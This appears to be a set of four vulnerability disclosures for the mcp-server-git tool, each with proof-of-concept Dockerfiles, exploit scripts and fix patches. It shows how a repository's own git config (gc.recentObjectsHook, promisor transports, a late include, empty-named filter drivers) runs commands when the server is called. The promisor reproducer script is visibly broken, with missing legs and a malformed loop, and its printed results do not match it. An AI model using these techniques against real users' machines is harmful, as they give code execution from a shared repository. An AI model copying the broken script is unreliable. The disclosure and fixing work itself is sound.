summary: mcp-server-git 2026.11.11: git_merge runs gc.recentObjectsHook from the repository's own config
description:
Summary
mcp-server-git promises (src/git/README.md, "A repository's own programs") that it never runs a program named by a repository's configuration, with or without --repository. git_merge breaks that promise: a successful merge, fast-forward included, ends in git's automatic maintenance (git maintenance run --auto, then git gc). A repository that ships gc.auto=1, gc.autoPackLimit=1 (two packs) and gc.recentObjectsHook=<shell command> in its own .git/config makes that gc run the command as the server user. harden_repo / HARDENED_CONFIG pins core.fsmonitor, core.hooksPath and six other keys but no gc.* or maintenance.* key, and core.hooksPath=/dev/null only stops the pre-auto-gc hook, not a config-named command.

Affected versions
mcp-server-git 2026.11.11 (tag v2.4.0). Unchanged on the default branch tip (HARDENED_CONFIG has no gc.* or maintenance.* entry). Needs git 2.42 or later (gc.recentObjectsHook); tested with git 2.47.3, mcp 2.3.0, GitPython 3.2.1, Python 3.12, all fresh PyPI resolutions.

Configuration
Default arguments (no --repository), stdio transport, git 2.42 or later on PATH. Client: the Python MCP SDK stdio client in client.py; any client that lets the model call git_merge behaves the same.

Steps to reproduce
1. Attacker prepares a repository (config only, no hooks): two packs, a branch "feature" ahead of main, one old (mtime 2020) unreachable loose object, and in .git/config gc.auto=1, gc.autoPackLimit=1, gc.recentObjectsHook="sh -c 'id > /tmp/PWNED-recentObjectsHook'". Everything is attacker-chosen; nothing from the victim side is needed. The old mtime survives tar or zip archives.
2. The victim opens it with mcp-server-git (default arguments) and the model calls git_merge {repo_path, source_branch: "feature"} (default fast_forward_only=true), for example after reading instructions in the repository.
3. With the PoC files below: sh run.sh builds mcp-server-git==2026.11.11 from PyPI in docker, then runs the attack and a control over the real MCP stdio protocol with --network none.

Expected result
git_merge fast-forwards and no program from the repository config runs.

Actual result
git_merge -> Fast-forwarded 'main' to 'feature'
RESULT: command ran as: uid=0(root) ... (the control, identical repository without the gc.recentObjectsHook line, prints "no command ran").

Impact
Command execution as the MCP server user from repository contents alone, on a call (git_merge) the README says is safe on untrusted repositories. Same class and promise as GHSA-6hqx-gqrx-c5r2 (core.fsmonitor), a different config key that fix did not cover.

Suggested fix
Pin automatic maintenance off with the other overrides: add ("maintenance.auto", "false") and ("gc.auto", "0") to HARDENED_CONFIG. With them the same PoC prints "no command ran" (output-patched.txt in the PoC files), and the git package tests pass (342 passed, python -m pytest tests, including a new regression test test_recent_objects_hook_never_runs, which fails without the fix). Patch (applies cleanly to v2.4.0 and to the default branch tip):

diff --git a/src/git/README.md b/src/git/README.md
index fab7aa5..22f5ced 100644
--- a/src/git/README.md
+++ b/src/git/README.md
@@ -186,6 +186,7 @@ A repository's configuration and hooks travel with it (an unpacked archive, a sh
 - Diffs pass `--no-ext-diff` and `--no-textconv`, so `diff.external`, `diff.<driver>.command` and `diff.<driver>.textconv` are ignored.
 - Each filter driver (`filter.<name>.clean`, `smudge`, `process`) and merge driver (`merge.<name>.driver`) that the repository's own configuration defines is emptied: files are staged and checked out unfiltered, and a file a merge driver would have merged is a conflict, which `git_merge` aborts. Drivers from your global or system configuration, such as Git LFS's, keep working.
 - `commit.gpgSign` and `merge.verifySignatures` are `false`, and `git_merge` passes `--no-gpg-sign` and `--no-verify-signatures`. Each `branch.<name>.mergeOptions` the repository's own configuration sets is emptied, since Git reads it as command-line options. `submodule.recurse` and `merge.autoStash` are `false`, and `core.pager` is `cat`.
+- `maintenance.auto` is `false` and `gc.auto` is `0`, so no commit, merge or checkout starts Git's automatic maintenance, whose garbage collection runs the commands a repository's `gc.recentObjectsHook` names.
 - `git_status`, `git_diff_unstaged` and `git_diff` pass `--ignore-submodules=dirty`, because looking for changes inside a submodule runs Git under the submodule's own configuration. A submodule whose checked-out commit moved is still reported; changes inside one are not, so run the tool on the submodule's path to see them.
 
 This needs Git 2.31 or later; with an older Git every tool call fails with an error saying so, rather than run unprotected.
diff --git a/src/git/src/mcp_server_git/server.py b/src/git/src/mcp_server_git/server.py
index cd1d874..8522718 100644
--- a/src/git/src/mcp_server_git/server.py
+++ b/src/git/src/mcp_server_git/server.py
@@ -128,6 +128,9 @@ def _git_text(repo: git.Repo, command: str, *args: str) -> str:
 # - `submodule.recurse` would carry checkout and merge into submodules, whose
 #   own configuration this override cannot neutralize (see `_LISTED_KEYS`).
 # - `merge.autoStash` keeps git_merge from stashing behind the tool's back.
+# - `maintenance.auto` and `gc.auto` keep a commit, merge or checkout from
+#   starting `git maintenance run --auto` (and so `git gc`), whose cruft repack
+#   runs every command in the repository's `gc.recentObjectsHook`.
 #
 # External diff programs and textconv filters are turned off per command
 # (`_DIFF_FLAGS`), and filter and merge drivers per repository (`_LISTED_KEYS`).
@@ -140,6 +143,8 @@ HARDENED_CONFIG: tuple[tuple[str, str], ...] = (
     ("submodule.recurse", "false"),
     ("status.submoduleSummary", "false"),
     ("merge.autoStash", "false"),
+    ("maintenance.auto", "false"),
+    ("gc.auto", "0"),
 )
 
 # A filter driver (`filter.<name>.clean`/`smudge`/`process`, applied by
diff --git a/src/git/tests/test_repository_config.py b/src/git/tests/test_repository_config.py
index c5ae1ee..4ada814 100644
--- a/src/git/tests/test_repository_config.py
+++ b/src/git/tests/test_repository_config.py
@@ -16,6 +16,7 @@ on Windows; the tests of `harden_repo` itself run everywhere.
 import os

+import subprocess
 import sys
 from pathlib import Path
 from typing import Any
@@ -259,6 +260,44 @@ async def test_no_hook_runs(repo: git.Repo, payload: Payload):
     assert payload.runs() == []
 
 
+@posix_only
+async def test_recent_objects_hook_never_runs(repo: git.Repo, payload: Payload):
+    # A merge ends in `git maintenance run --auto`; with gc.auto=1 and two
+    # packs the repository forces a gc, whose cruft repack asks the hook about
+    # every old unreachable object.
+    repo.git.repack("-a", "-d")
+    repo.git.checkout("-b", "feature")
+    commit_file(repo, "feature.txt", "feature\n")
+    repo.git.repack("-d")
+    repo.git.checkout("main")
+    set_config(
+        repo,
+        gc__auto="1",
+        gc__autoPackLimit="1",
+        gc__autoDetach="false",
+        gc__recentObjectsHook=payload.command("recent"),
+    )
+    # An unreachable loose object old enough that gc must consult the hook.
+    sha = subprocess.run(
+        ["git", "hash-object", "-w", "--stdin"],
+        cwd=root_of(repo),
+        input=b"stale",
+        capture_output=True,
+        check=True,
+        text=False,
+    ).stdout.decode().strip()
+    path = Path(repo.git_dir) / "objects" / sha[:2] / sha[2:]
+    os.utime(path, (0, 0))
+
+    result = await call(
+        "git_merge",
+        {"repo_path": str(root_of(repo)), "source_branch": "feature"},
+    )
+
+    assert result["isError"] is False, result
+    assert payload.runs() == []
+
+
 # --------------------------------------------------------------------------
 # Filter and merge drivers
 # --------------------------------------------------------------------------

Dedupe
Searched the GHSA list (GHSA-6hqx-gqrx-c5r2 covers core.fsmonitor only), gh search prs and issues in modelcontextprotocol/servers for gc.auto, git maintenance, recentObjectsHook, auto gc, hardened config (0 results), commits on src/git/src/mcp_server_git/server.py since the release (none touch gc or maintenance), NVD keyword search (0 results).

summary: mcp-server-git: a repository's promisor configuration runs a program during a lazy fetch
description:
### Summary


`harden_repo()` pins a fixed set of command-bearing configuration keys, and none of them controls a transport. A repository's own `.git/config` can mark a remote as a promisor and name the program git runs to fetch from it: `remote.<name>.uploadpack`, `core.sshCommand`, `core.alternateRefsCommand`, `core.gitProxy`, or a credential helper.

When a tool needs an object the local store does not have, git starts a lazy fetch and runs that program as the server user. Read-only tools reach it.

A plain, complete repository is enough. No partial-clone lineage is required.

### Details

HARDENED_CONFIG` (`server.py` L134-L143) pins `core.fsmonitor`, `core.hooksPath`, `core.pager`, `commit.gpgSign`, `merge.verifySignatures`, `submodule.recurse`, `status.submoduleSummary` and `merge.autoStash`. `harden_repo()` (L188-L226) additionally empties every filter and merge driver `_LISTED_KEYS` (L157-L160) matches. None of these is a transport, and nothing sets `GIT_NO_LAZY_FETCH`, so git is free to fetch a missing object.

That fetch is a second git process. It reads the same repository configuration and picks a program from keys the list does not name. `remote.<name>.uploadpack` replaces the server-side command, `core.sshCommand` replaces the ssh transport, and `core.alternateRefsCommand` runs during fetch negotiation.

`harden_repo`'s honesty check, that git applied the overrides because `core.hooksPath` appears at command scope, still passes. The overrides it checks are not the ones the fetch needs.

Two shapes matter, and the second is the weaker precondition:

1. A genuine partial clone (`git clone --filter=blob:none`) whose config gains `remote.origin.uploadpack`. A read-only call triggers the fetch and the program runs. When the payload execs the real `git-upload-pack` afterwards, the tool call even completes normally.
2. A plain, complete repository whose config sets `remote.origin.promisor=true`, `remote.origin.url` and `core.sshCommand`. Any call that references an absent object id makes git try to fetch it, and the configured program runs before a connection is attempted. No network, server or credential is needed.

Observed to trigger: `git_show`, `git_diff`, `git_diff_unstaged`, `git_branch --contains`. Not observed: `git_status`, `git_log`, plain `git_branch`, `git_remote`.


### Proof of concept

Run in the image built from this document (no network needed):

```bash
docker build -t pter-mcp-git-promisor .
docker run --rm --network none pter-mcp-git-promisor
```

Six exploit legs and three controls, each on a fresh repository, each checked against a marker holding `id` output.

```
  [RAN ] leg1 git_show                       (plain repo, one missing blob, uploadpack)
  [RAN ] leg2 git_branch --contains          (plain complete repo, absent id)
  [RAN ] leg2 git_diff absent target
  [RAN ] leg3 git_show on partial clone
  [RAN ] leg4 core.sshCommand
  [RAN ] leg5 --repository
  [RAN ] leg6 sshCommand with absent id
  [ok  ] control1 no program
  [ok  ] control2 nothing missing
  [ok  ] control3 no promisor
exploit legs firing: 7/7   controls broken: 0/3   normal tools failing: 0
RESULT: VULNERABLE
```

`git_status`, `git_diff_unstaged`, `git_show`, `git_log` and `git_branch` all return normally on a healthy repository in the same run.

## Reproducer source

### `Dockerfile`

```dockerfile
FROM python:3.12-slim

# git 2.47.3 is the version the advisory was validated against; procps provides
# ps for the parent-process evidence in the payload.
RUN apt-get update \
    && apt-get install -y --no-install-recommends git ca-certificates procps \
    && rm -rf /var/lib/apt/lists/*

RUN python3 -m pip install --no-cache-dir "mcp-server-git==2026.11.11"

WORKDIR /work
COPY poc.sh /work/poc.sh
RUN chmod +x /work/poc.sh

# No network at run time. The lazy fetch never needs one: the program named by
# the repository's configuration runs before any connection is attempted.
ENTRYPOINT ["bash", "/work/poc.sh"]
```

### `poc.sh`

```bash
#!/usr/bin/env bash
# =============================================================================
# mcp-server-git 2026.11.11 - a repository's promisor configuration makes a
# read-only tool start a lazy fetch, and that fetch runs a program the
# repository names (remote.<name>.uploadpack, core.sshCommand).
#
# harden_repo() pins a fixed list of config keys and never disables lazy
# fetching. None of the keys it pins controls a transport, so the second git
# process that the fetch starts is free to run the configured program.
#
# Run in the image built from ./Dockerfile (no network needed):
#   docker build -t pter-mcp-git-promisor .
#   docker run --rm --network none pter-mcp-git-promisor
#
# Six exploit legs, three controls, and a normal-operation check. Every leg uses
# a fresh repository and a marker holding id output.
# =============================================================================
set -u

TOK=$(python3 -c 'import secrets; print(secrets.token_hex(6))')
BASE=/tmp/poc-$TOK
mkdir -p "$BASE"

export GIT_AUTHOR_NAME=dev GIT_AUTHOR_EMAIL=dev@example.com
export GIT_COMMITTER_NAME=dev GIT_COMMITTER_EMAIL=dev@example.com

EXPLOIT_TOTAL=0; FIRED=0; CONTROL_TOTAL=0; CTRL_BAD=0; NORMAL_BAD=0

# --------------------------------------------------------------- MCP client
CLIENT=$BASE/client.py
cat > "$CLIENT" <<'PY'
import json, subprocess, sys
argv = json.loads(sys.argv[1]); tool = sys.argv[2]; arguments = json.loads(sys.argv[3])
proc = subprocess.Popen(argv, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE, text=True, bufsize=1)
def send(m): proc.stdin.write(json.dumps(m) + "\n"); proc.stdin.flush()
def recv(want):
    while True:
        line = proc.stdout.readline()
        if not line:
            return {"error": {"message": "closed: " + proc.stderr.read()[-400:]}}
        message = json.loads(line)
        if message.get("id") == want:
            return message
send({"jsonrpc": "2.0", "id": 1, "method": "initialize",
      "params": {"protocolVersion": "2025-11-25", "capabilities": {},
                 "clientInfo": {"name": "poc", "version": "1"}}})
init = recv(1)
send({"jsonrpc": "2.0", "method": "notifications/initialized"})
send({"jsonrpc": "2.0", "id": 2, "method": "tools/call",
      "params": {"name": tool, "arguments": arguments}})
reply = recv(2)
result = reply.get("result") or {}
text = "".join(c.get("text", "") for c in result.get("content", []) or [])
if "error" in reply and not text:
    text = json.dumps(reply["error"])
info = (init.get("result") or {}).get("serverInfo", {})
print(f"[{info.get('name')} {info.get('version')}] {tool} "
      f"isError={bool(result.get('isError'))} :: " + " | ".join(text.split())[:300])
proc.stdin.close()
try: proc.wait(timeout=20)
except Exception: proc.kill()
PY

run_tool() {  # <server args json> <tool> <arguments json>
  python3 "$CLIENT" "$1" "$2" "$3"
}

# ------------------------------------------------------------------ fixtures
make_upstream() {   # a repository that may be fetched from
  local up="$1"
  rm -rf "$up"; git init -q -b main "$up"
  echo u1 > "$up/f.txt"; git -C "$up" add f.txt; git -C "$up" commit -qm one
  echo u2 > "$up/f.txt"; git -C "$up" commit -qam two
  git -C "$up" config uploadpack.allowFilter true
}

make_repo_missing_blob() {   # a plain repository whose older blob is not on disk
  local dir="$1" old
  rm -rf "$dir"; git init -q -b main "$dir"
  echo "old-$TOK" > "$dir/a.txt"; git -C "$dir" add a.txt; git -C "$dir" commit -qm one
  echo "new-$TOK" > "$dir/a.txt"; git -C "$dir" commit -qam two
  old=$(git -C "$dir" rev-parse HEAD~1:a.txt)
  rm -f "$dir/.git/objects/${old:0:2}/${old:2}"
}

make_repo_complete() {   # a plain repository with nothing missing
  local dir="$1"
  rm -rf "$dir"; git init -q -b main "$dir"
  echo "a-$TOK" > "$dir/a.txt"; git -C "$dir" add a.txt; git -C "$dir" commit -qm one
  echo "b-$TOK" > "$dir/a.txt"; git -C "$dir" commit -qam two
}

absent_sha() { python3 -c 'import secrets; print(secrets.token_hex(20))'; }

# The program the repository names. It writes the marker, then hands over to the
# real upload-pack so a legitimate fetch still completes.
uploadpack_program() { echo "sh -c 'id > $1; exec git-upload-pack \"\$@\"' --"; }
ssh_program()        { echo "sh -c 'id > $1; exit 1'"; }

# ------------------------------------------------------------------- reporting
leg() {   # <label> <marker> <expect: fire|silent> [output line]
  local label="$1" mark="$2" expect="$3"
  if [ "$expect" = "fire" ]; then EXPLOIT_TOTAL=$((EXPLOIT_TOTAL+1))
  else CONTROL_TOTAL=$((CONTROL_TOTAL+1)); fi
  if [ -s "$mark" ] && grep -q "uid=" "$mark"; then
    if [ "$expect" = "fire" ]; then
      FIRED=$((FIRED+1)); echo "  [RAN ] $label -> $(tr '\n' ' ' < "$mark")"
    else
      CTRL_BAD=$((CTRL_BAD+1)); echo "  [BAD ] $label -> payload ran in a control"
    fi
  else
    if [ "$expect" = "fire" ]; then
      echo "  [MISS] $label -> no marker (expected execution)"
    else
      echo "  [ok  ] $label -> nothing ran"
    fi
  fi
}

UP=$BASE/upstream
make_upstream "$UP"

echo "mcp-server-git promisor lazy-fetch PoC"
echo "git: $(git --version)   server: $(python3 -c 'import importlib.metadata as m; print(m.version("mcp-server-git"))')"
echo "upstream: $UP"
echo "token: $TOK"
echo

# ---------------------------------------------------------------- exploit legs
echo "== exploit legs"

L=$BASE/leg1; M=$BASE/m1
echo "  leg1: plain repo, one missing blob, promisor + remote.origin.uploadpack -> git_show HEAD"
make_repo_missing_blob "$L"

# ------------------------------------------------------------- normal operation
echo
echo "== normal operation on a healthy repository"
N=$BASE/normal; make_repo_complete "$N"

for spec in \
  "git_status|{\"repo_path\":\"$N\"}" \
  "git_diff_unstaged|{\"repo_path\":\"$N\"}" \
  "git_show|{\"repo_path\":\"$N\",\"revision\":\"HEAD\"}" \

    echo "  $out"
    case $out in *"isError=False"*) ;; *) NORMAL_BAD=$((NORMAL_BAD+1));; esac
done

# --------------------------------------------------------------------- verdict
echo
echo "exploit legs firing: $FIRED/$EXPLOIT_TOTAL   controls broken: $CTRL_BAD/$CONTROL_TOTAL   normal tools failing: $NORMAL_BAD"
if [ "$FIRED" -eq "$EXPLOIT_TOTAL" ] && [ "$CTRL_BAD" -eq 0 ] && [ "$NORMAL_BAD" -eq 0 ]; then
  echo "RESULT: VULNERABLE"
  exit 0
fi
if [ "$FIRED" -gt 0 ] && [ "$CTRL_BAD" -eq 0 ]; then
  echo "RESULT: VULNERABLE ($FIRED of $EXPLOIT_TOTAL exploit legs fired)"
  exit 0
fi
echo "RESULT: NOT VULNERABLE"
exit 1
```

### Impact

An attacker who supplies a repository runs an arbitrary program as the account serving the tool, from a read-only call, in the default configuration and under `--repository`.

Delivery needs a channel that carries the `.git` directory: a tar or zip of a working tree, a shared folder, a CI artifact, a copied workspace. A `git clone` does not carry local configuration, which is the same limitation the other repository-configuration findings accept.

The program runs before any connection is made, so the attacker needs neither a reachable remote nor credentials. Read access to the outside is enough to choose the target repository's path: the payload, not the network, decides what happens next.

## Patch

Two independent changes, either of which closes the reported legs, and both recommended:

```diff
 HARDENED_CONFIG = (
     ...,
     ("merge.autoStash", "false"),
+    ("protocol.allow", "never"),
 )
```

and, in the environment `harden_repo` builds for every git command:

```diff
+    env["GIT_NO_LAZY_FETCH"] = "1"
```

`GIT_NO_LAZY_FETCH=1` stops the fetch before git selects a transport at all. `protocol.allow=never` refuses every transport if one is ever reached again. Both were verified against the installed package: the exploit legs stop and the normal tools keep working.

## Workarounds

- Run the server against complete repositories, or set `GIT_NO_LAZY_FETCH=1` in its environment.
- Do not open repositories received as archives or shared folders.
- Run the server as a user without credentials that matter.

summary: mcp-server-git: a config include created by the merged branch runs a command during git_merge
description:
### Summary

`harden_repo` reads the filter and merge drivers a repository defines, blanks them, and fixes that list in the environment of the git commands that follow. It does this once per tool call, before any git command runs.

A repository can `[include]` a file that does not exist yet. Git silently ignores an include whose path is missing, so the read finds nothing to blank.

`git_merge` then merges a branch that adds that file. The merge conflicts, and the server runs `git merge --abort` to restore the repository. That is a new git process. It reads the configuration again, the include now resolves, the filter it defines was never blanked, and restoring the file runs it.

The tool still reports that the merge was aborted and the repository is unchanged.

### Details

`open_repo` (`server.py` L1207-L1220) calls `harden_repo` (L188-L226) once. That runs `git config --get-regexp`, which does follow includes, collects the repository-scope filter and merge drivers, and pins empty overrides for every later git command in the call.

With `[include] path = ../evil.cfg` in `.git/config` and no `evil.cfg` on the current branch, nothing is listed and nothing is blanked.

`git_merge` runs `git merge` (L622-L637). The source branch adds `evil.cfg`, which defines `filter.x.smudge` and `filter.x.clean`, and the current branch's `.gitattributes` already says `* filter=x`. That is harmless while `x` is undefined. The merge process read its configuration at startup, so it does not run the filter either. It writes `evil.cfg` into the working tree and stops on a conflict in another file.

`_merge_failure` (L530-L554) then starts new git processes: `git diff --name-only --diff-filter=U` and `git merge --abort` (L548). Each reads the configuration fresh, so the include resolves. `filter.x` is defined now and was never overridden, and restoring the conflicted file runs it.

In our runs, the payload's parent process was `git merge --abort` for both the clean and the smudge command.

### Proof of concept

Tested in a container with git 2.47.3 and mcp-server-git 2026.11.11:

```bash
docker build -t pter-mcp-git-include .
docker run --rm --network none pter-mcp-git-include
```

The script builds the repository, then drives the real server over MCP stdio: `git_status`, then `git_merge` with `fast_forward_only=false`. The payload writes `id` output and the parent's command line to a file named with a random marker. There are two legs and two modes.

| Leg | Mode | Result |
|---|---|---|
| exploit | default | payload ran, parent was `git merge --abort` |
| control | default | nothing ran |
| exploit | `--repository` | payload ran, parent was `git merge --abort` |
| control | `--repository` | nothing ran |

```
payload(clean/smudge): RAN
  pwn-clean-MARK -> uid=0(root) gid=0(root) groups=0(root)
    started by: git merge --abort
  pwn-smudge-MARK -> uid=0(root) gid=0(root) groups=0(root)
    started by: git merge --abort
```

The control leg is identical except that `.git/config` has no `[include]` line, which is what isolates the include as the cause.

## Reproducer source

### `Dockerfile`

```dockerfile
FROM python:3.12-slim

RUN apt-get update \
    && apt-get install -y --no-install-recommends git ca-certificates procps \
    && rm -rf /var/lib/apt/lists/*

RUN pip install --no-cache-dir mcp-server-git==2026.11.11

WORKDIR /poc
COPY poc.sh /poc/poc.sh
RUN chmod +x /poc/poc.sh

# No network at run time: the only thing that may run is what the repository defines.
ENTRYPOINT ["bash", "/poc/poc.sh"]
```

### `poc.sh`

```bash
#!/bin/bash
# =============================================================================
# mcp-server-git 2026.11.11 - config include created by the merged branch
# =============================================================================
#
# harden_repo reads the repository's filter/merge drivers ONCE per tool call and
# blanks what it finds. A .git/config can [include] a working-tree file that does
# not exist yet, so that read finds nothing to blank.
#
# git_merge then merges a branch that ADDS that file. The merge conflicts, so the
# server runs `git merge --abort` to restore the repository. That is a new git
# process, and it reads the configuration again: the include now resolves, the
# filter is defined and was never blanked, and restoring the file runs it.
#
# Two legs: exploit has the [include] line, control does not.
# Two modes: default, and --repository.
# =============================================================================
set -u

MARK=$(head -c16 /dev/urandom | od -An -tx1 | tr -d ' \n')

git config --global user.email user@example.com
git config --global user.name user
git config --global init.defaultBranch main
git config --global protocol.file.allow always

# -----------------------------------------------------------------------------
# MCP client: speaks JSON-RPC to the real server over stdio.
# -----------------------------------------------------------------------------
cat > /tmp/client.py <<'PY'
import json
import subprocess
import sys

args = json.loads(sys.argv[1])
calls = json.loads(sys.argv[2])

proc = subprocess.Popen(["mcp-server-git", *args], stdin=subprocess.PIPE,
                        stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)

def send(message):
    proc.stdin.write(json.dumps(message) + "\n")
    proc.stdin.flush()

def receive(request_id):
    while True:
        line = proc.stdout.readline()
        if not line:
            return {"error": "server closed"}
        message = json.loads(line)
        if message.get("id") == request_id:
            return message

send({"jsonrpc": "2.0", "id": 0, "method": "initialize",
      "params": {"protocolVersion": "2025-11-25", "capabilities": {},
                 "clientInfo": {"name": "poc", "version": "1"}}})
receive(0)
send({"jsonrpc": "2.0", "method": "notifications/initialized"})

for index, (tool, arguments) in enumerate(calls, start=1):
    send({"jsonrpc": "2.0", "id": index, "method": "tools/call",
          "params": {"name": tool, "arguments": arguments}})
    reply = receive(index)
    result = reply.get("result", reply)
    text = " ".join(part.get("text", "") for part in result.get("content", []))
    text = " ".join(text.split())
    state = "ERROR" if result.get("isError") else "OK"
    print(f"{tool}: {state} - {text[:170]}")

proc.stdin.close()
proc.wait(timeout=20)
PY

# -----------------------------------------------------------------------------
# Build the repository. The included file exists only on the feature branch, so
# on main the include points at nothing.
# -----------------------------------------------------------------------------
build_repo() {
  local dst="$1" with_include="$2"
  rm -rf "$dst"; mkdir -p "$dst"; cd "$dst" || exit 1

  git init -q -b main .
  printf '* filter=x\n' > .gitattributes
  echo hello > f.txt
  echo base > m.txt
  git add . >/dev/null; git commit -qm init

  git checkout -q -b feature
  echo theirs > m.txt
  {
    printf '[filter "x"]\n'
    printf '\tsmudge = "id > /tmp/pwn-smudge-%s; ps -o args= -p $PPID >> /tmp/pwn-smudge-%s; cat"\n' "$MARK" "$MARK"
    printf '\tclean = "id > /tmp/pwn-clean-%s; ps -o args= -p $PPID >> /tmp/pwn-clean-%s; cat"\n' "$MARK" "$MARK"
  } > evil.cfg
  git add . >/dev/null; git commit -qm theirs

  git checkout -q main
  echo ours > m.txt
  git commit -qam ours >/dev/null

  # The only malicious element: the repository's own config includes a file that
  # does not exist on this branch.
  if [ "$with_include" = "1" ]; then
    printf '[include]\n\tpath = ../evil.cfg\n' >> .git/config
  fi

  cd /tmp || exit 1
}

markers() { ls /tmp/pwn-*-"$MARK" 2>/dev/null; }

# -----------------------------------------------------------------------------
for mode in default repository; do
  for leg in exploit control; do
    include=0; [ "$leg" = "exploit" ] && include=1
    repo=/tmp/repo-$leg
    rm -f /tmp/pwn-*-"$MARK"

    echo
    echo "=================================================================="
    echo "  $leg leg - $mode mode"
    echo "=================================================================="
    build_repo "$repo" "$include"
    if [ "$include" = "1" ]; then
      echo "  .git/config includes ../evil.cfg   (evil.cfg is not on main)"
    else
      echo "  .git/config has no include         (control)"
    fi

    server_args='[]'
    [ "$mode" = "repository" ] && server_args="[\"--repository\",\"$repo\"]"

    python3 /tmp/client.py "$server_args" \
      "[[\"git_status\",{\"repo_path\":\"$repo\"}],
        [\"git_merge\",{\"repo_path\":\"$repo\",\"source_branch\":\"feature\",\"fast_forward_only\":false}]]"

    found=$(markers)
    if [ -n "$found" ]; then
      echo "  payload(clean/smudge): RAN"
      for file in $found; do
        echo "    $(basename "$file" | sed "s/$MARK/MARK/") -> $(head -1 "$file")"
        sed -n '2p' "$file" | sed 's/^/      started by: /'
      done
    else
      echo "  payload(clean/smudge): did not run"
    fi
  done
done

echo
echo "=================================================================="
echo "  verdict"
echo "=================================================================="
echo "  marker: $MARK"
echo "  exploit leg should show RAN in both modes; control leg in neither."
```


### Impact

Arbitrary command execution as the user running the MCP server.

The preconditions are narrower than GHSA-6hqx-gqrx-c5r2, so they are worth stating exactly:

- The attacker supplies a repository with an attacker-written `.git/config`: an archive, a shared folder, a copied workspace. A plain clone does not carry it.
- That repository has a branch which adds the included file and conflicts with the current branch.
- Someone calls `git_merge` on that branch with `fast_forward_only=false`. That is not the default, but it is the documented way to merge diverged branches.

`--repository` confinement does not help. The tool's response looks like an ordinary merge conflict.

## Patch

Read the drivers again before `_merge_failure` runs more git commands, since the merge may have created a file that the configuration includes:

```diff
--- a/src/git/src/mcp_server_git/server.py
+++ b/src/git/src/mcp_server_git/server.py
@@ -537,6 +537,10 @@
     unchanged = "The merge was aborted and the repository is unchanged."
+    # The merge rewrote the working tree, and a file it wrote may be one the
+    # repository's configuration includes: read the drivers again before the
+    # git commands below, which read the configuration afresh.
+    harden_repo(repo)
     if not (Path(repo.git_dir) / "MERGE_HEAD").exists():
```

With this change the exploit legs stop running the payload, whether or not the separate empty-driver-name issue is also fixed, and `git_merge` still reports the conflict and leaves the repository clean.

A broader option is to refuse repository-scope `include.path` and `includeIf.*.path` in `harden_repo`. That covers any future tool that changes the working tree and then runs git again. We did not test it.

## Workarounds

- Do not merge branches of repositories you received from someone else, or do it in a fresh clone where the `.git/config` is the one git wrote.
- Run the server as a user without credentials that matter.
- Require approval for `git_merge` specifically. The read-only tools are not affected here.

summary: mcp-server-git: a repository's own config runs a command, because the hardening misses an empty driver name
description:
### Summary

Version 2026.11.11 added a defence against repositories that carry their own config. When the server opens a repository, it lists the filter and merge drivers that repository defines, then blanks each one, so nothing in the repository can run a program. The list is built with this pattern:

```python
_LISTED_KEYS = (
    r"^(core\.hookspath|filter\..+\.(clean|smudge|process)|merge\..+\.driver"
    r"|branch\..+\.mergeoptions)$"
)
```

`\.+\.` needs at least one character between the dots. Git also accepts a driver with an empty name. A repository that writes `[filter ""]` gets the config keys `filter..clean`, `filter..smudge` and `merge..driver`, none of which match, so none of them is blanked. `.gitattributes` selects that driver with `filter=` or `merge=`.

The result is that a repository runs a command of its choosing, as the user running the server, from a read-only tool call.


### Details

`harden_repo` collects the keys with `git config --show-scope --get-regexp` and the pattern above (`server.py` L157-L160). It blanks what it finds through `GIT_CONFIG_COUNT` (L188-L226).

Git parses `[filter ""]` as a driver whose name is the empty string. `.gitattributes` sets the attribute to the empty string, which is neither set nor unset, so git looks the driver up by name and finds it. `merge=` works the same way.

The approach itself is sound. If the key were on the list, the override works: an explicit `GIT_CONFIG_KEY_n=filter..clean` with an empty value stops the command. The problem is only the pattern.

Every tool goes through `open_repo` (`server.py` L1207-L1220), which calls `harden_repo` and then runs git. When the repository arrives as an archive and gets unpacked, the index no longer matches the files on disk, so `git status` re-hashes tracked files through the clean filter. `git add` runs the clean filter, `git checkout` runs the smudge filter, and a conflicting `git merge` runs the merge driver.


### Proof of concept

The two files below are all you need. They were tested in a container with git 2.47.3 and mcp-server-git 2026.11.11.

```bash
docker build -t pter-mcp-git-poc .
docker run --rm --network none pter-mcp-git-poc
```

The script builds a repository whose own `.git/config` holds the payload, ships it as a tar archive (the delivery model from GHSA-6hqx-gqrx-c5r2), unpacks it, and drives the real server over MCP stdio: `initialize`, `notifications/initialized`, then `tools/call`.

There are two legs. The exploit leg uses a driver named `""`. The control leg is identical except the driver is called `x`, which the existing hardening does blank. The payload writes `id` output to a file named with a random marker, so what proves execution is a file the command created, not anything the tool reported back.

| Tool | What the tool told the caller | Did the payload run? |
|---|---|---|
| `git_status` (default mode) | working tree clean | yes |
| `git_status` (`--repository`) | working tree clean | yes |
| `git_add` | files staged successfully | yes |
| `git_checkout` | switched to branch `feature` | yes |
| `git_merge` | merge aborted, repository unchanged | yes |

```
exploit legs executing payload: 5/5   control legs executing payload: 0/5
RESULT: VULNERABLE
payload output: uid=0(root) gid=0(root) groups=0(root)
```

The control leg is the part that matters. With a normally named driver nothing runs, so the difference really is the empty name and not the server executing repository config in general.

## Reproducer source

### `Dockerfile`

```dockerfile
FROM python:3.12-slim

# git is the vulnerable surface; pin the package under test.
RUN apt-get update \
    && apt-get install -y --no-install-recommends git ca-certificates binutils \
    && rm -rf /var/lib/apt/lists/*

RUN pip install --no-cache-dir mcp-server-git==2026.11.11

WORKDIR /poc
COPY poc.sh /poc/poc.sh
RUN chmod +x /poc/poc.sh

# No network at run time: the only thing that may reach the filesystem is the
# payload the repository itself defines.
ENTRYPOINT ["bash", "/poc/poc.sh"]
```

### `poc.sh`

```bash
#!/bin/bash
# =============================================================================
# mcp-server-git 2026.11.11 - a repository's own config runs a command
# =============================================================================
#
# The server hardens a repository before every git call: it lists the filter and
# merge drivers the repository defines and blanks each one, so repository content
# cannot run programs. The pattern it uses requires a non-empty driver name:
#
#     filter\..+\.(clean|smudge|process)      <- '+' means at least one char
#
# Git also accepts a driver with an EMPTY name. A repository that defines
# [filter ""] therefore keeps its clean/smudge command, and calling a read-only
# tool runs it.
#
# This script shows that twice:
#   exploit leg  driver named ""   - should run the payload (it does)
#   control leg  driver named "x"  - the hardening blanks it (it does)
#
# Every leg prints two things: what the tool told the caller, and whether the
# payload actually ran. The gap between those two lines is the vulnerability.
# =============================================================================
set -u

